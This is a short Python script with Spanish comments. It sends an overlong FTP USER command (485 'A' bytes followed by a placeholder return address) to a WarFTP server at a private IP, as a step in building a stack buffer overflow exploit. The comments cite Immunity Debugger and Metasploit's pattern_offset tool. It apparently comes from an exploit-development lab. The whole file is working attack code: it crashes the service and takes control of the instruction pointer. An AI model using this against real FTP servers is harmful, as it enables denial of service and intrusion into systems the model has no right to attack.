#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Meto en el x41 multiplicado por 485 que es resultado que me dio al ejecutar 2.py en inmunity: 32714131 y despés lo ejecute con el offset: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 32714131
buffer = "\x41" * 485

# De este script saco el JMP ESP

# sobrescribo el eip con esa direccion
buffer += "\xEF\xBE\xAD\xDE" 
s.connect(('10.0.2.16',21))
data = s.recv(1024)
print ("Enviando al WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Final")
